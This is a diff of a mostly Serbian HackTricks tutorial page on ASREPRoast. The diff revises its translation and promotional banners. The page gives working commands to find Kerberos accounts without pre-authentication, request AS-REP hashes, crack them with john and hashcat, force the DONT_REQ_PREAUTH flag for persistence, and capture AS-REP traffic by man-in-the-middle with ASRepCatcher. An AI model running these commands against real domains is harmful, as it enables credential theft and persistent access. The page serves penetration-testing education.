@@ -1,47 +1,48 @@
 # ASREPRoast
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!
+Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
-**Hakerski Uvidi**\
-Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja
+**Hacking Insights**\
+Engage with content that delves into the thrill and challenges of hacking
 
-**Vesti o Hakovanju u Realnom Vremenu**\
-Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu
+**Real-Time Hack News**\
+Keep up-to-date with fast-paced hacking world through real-time news and insights
 
-**Najnovije Najave**\
-Budite informisani o najnovijim nagradama za pronalaženje bagova i bitnim ažuriranjima platformi
+**Latest Announcements**\
+Stay informed with the newest bug bounties launching and crucial platform updates
 
-**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!
+**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
 ## ASREPRoast
 
-ASREPRoast je sigurnosni napad koji iskorišćava korisnike koji nemaju **Kerberos pre-authentication required atribut**. Essencijalno, ova ranjivost omogućava napadačima da zatraže autentikaciju za korisnika od Domain Controller-a (DC) bez potrebe za korisnikovom lozinkom. DC zatim odgovara porukom enkriptovanom korisnikovim ključem izvedenim iz lozinke, koju napadači mogu pokušati da dešifruju offline kako bi otkrili korisnikovu lozinku.
+ASREPRoast je bezbednosni napad koji koristi korisnike koji nemaju **atribut potreban za Kerberos pre-autentifikaciju**. Suštinski, ova ranjivost omogućava napadačima da zatraže autentifikaciju za korisnika od Kontrolera domena (DC) bez potrebe za korisnikovom lozinkom. DC zatim odgovara porukom šifrovanom korisnikovim ključem izvedenim iz lozinke, koju napadači mogu pokušati da dešifruju offline kako bi otkrili korisnikovu lozinku.
 
 Glavni zahtevi za ovaj napad su:
 
-* **Odsustvo Kerberos pre-authentication-a**: Ciljni korisnici moraju imati ovu sigurnosnu funkciju onemogućenu.
-* **Povezanost sa Domain Controller-om (DC)**: Napadači moraju imati pristup DC-u kako bi slali zahteve i primili enkriptovane poruke.
-* **Opcioni domenski nalog**: Imajući domenski nalog omogućava napadačima efikasnije identifikovanje ranjivih korisnika putem LDAP upita. Bez takvog naloga, napadači moraju da nagađaju korisnička imena.
+* **Nedostatak Kerberos pre-autentifikacije**: Ciljani korisnici ne smeju imati ovu bezbednosnu funkciju omogućenu.
+* **Povezanost sa Kontrolerom domena (DC)**: Napadači trebaju pristup DC-u da bi slali zahteve i primali šifrovane poruke.
+* **Opcionalni domen korisnički nalog**: Imati domen korisnički nalog omogućava napadačima da efikasnije identifikuju ranjive korisnike putem LDAP upita. Bez takvog naloga, napadači moraju da pogađaju korisnička imena.
 
-#### Enumeracija ranjivih korisnika (potrebne domenske akreditacije)
+#### Enumerating vulnerable users (need domain credentials)
 
-{% code title="Korišćenje Windows-a" %}
+{% code title="Using Windows" %}
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -51,9 +52,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-{% endcode %}
-
-#### Zahtevaj AS_REP poruku
+#### Zahtev AS\_REP poruke
 
 {% code title="Korišćenje Linux-a" %}
 ```bash
@@ -72,19 +71,19 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-AS-REP Roasting sa Rubeusom će generisati 4768 sa vrstom šifrovanja 0x17 i vrstom preautentikacije 0.
+AS-REP Roasting sa Rubeus će generisati 4768 sa tipom enkripcije 0x17 i tipom preautentifikacije 0.
 {% endhint %}
 
-### Krekovanje
+### Razbijanje
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
-### Upornost
+### Persistence
 
-Prisilite **preauth** da nije potreban za korisnika za koga imate dozvole **GenericAll** (ili dozvole za pisanje svojstava):
+Prisilite **preauth** da nije potreban za korisnika gde imate **GenericAll** dozvole (ili dozvole za pisanje svojstava):
 
-{% code title="Korišćenje Windows-a" %}
+{% code title="Using Windows" %}
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -94,10 +93,12 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
-## ASREProast bez pristupnih podataka
+{% endcode %}
 
-Napadač može koristiti poziciju čoveka u sredini da uhvati AS-REP pakete dok prolaze kroz mrežu, ne oslanjajući se na isključenu Kerberos preautentikaciju. Stoga ova tehnika funkcioniše za sve korisnike na VLAN-u.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nam omogućava da to uradimo. Osim toga, ovaj alat prisiljava klijentske radne stanice da koriste RC4 izmenom pregovora Kerberosa.
+## ASREProast bez kredencijala
+
+Napadač može iskoristiti poziciju man-in-the-middle da uhvati AS-REP pakete dok prolaze kroz mrežu, bez oslanjanja na to da je Kerberos pre-autentifikacija onemogućena. Stoga funkcioniše za sve korisnike na VLAN-u.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nam to omogućava. Štaviše, alat prisiljava klijentske radne stanice da koriste RC4 menjajući Kerberos pregovaranje.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -116,29 +117,30 @@ ASRepCatcher listen
 
 <figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!
+Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na greške!
 
-**Hakerski uvidi**\
+**Hacking Insights**\
 Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja
 
-**Vesti o hakovanju u realnom vremenu**\
+**Real-Time Hack News**\
 Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu
 
-**Poslednje najave**\
-Budite informisani o najnovijim nagradama za pronalaženje bagova i važnim ažuriranjima platforme
+**Latest Announcements**\
+Budite informisani o najnovijim nagradama za greške i važnim ažuriranjima platformi
 
-**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!
+**Pridružite nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!
+
+{% hint style="success" %}
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podrška HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
